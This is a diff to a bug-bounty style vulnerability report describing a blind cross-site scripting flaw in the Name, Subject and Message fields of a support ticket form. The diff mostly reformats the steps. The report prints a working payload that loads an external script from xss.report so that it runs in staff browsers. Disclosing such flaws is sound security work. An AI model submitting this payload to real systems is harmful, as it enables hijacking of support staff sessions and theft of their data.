@@ -13,15 +13,17 @@ I identified a blind XSS in the Support Ticket form. The Name, Subject and  Mess
 ---
 ## Vulnerable Endpoint
 ```
-https://kzlabs.com/64.php
+http://kzlabs.com/64.php
 ```
 **Injection points** Name, Subject and  Message fields in the Support Ticket creation form
 
 ---
 ## Steps to Reproduce
 1. Navigate to the support Ticket form on the application
-`https://kzlabs.com/64.php`
-2. In the **Name**, **Subject** and **Message** fields enter the following payload:
+```
+https://kzlabs.com/64.php
+```
+3. In the **Name**, **Subject** and **Message** fields enter the following payload:
 ```
 '"><script src=https://xss.report/c/ali1></script>
 ```
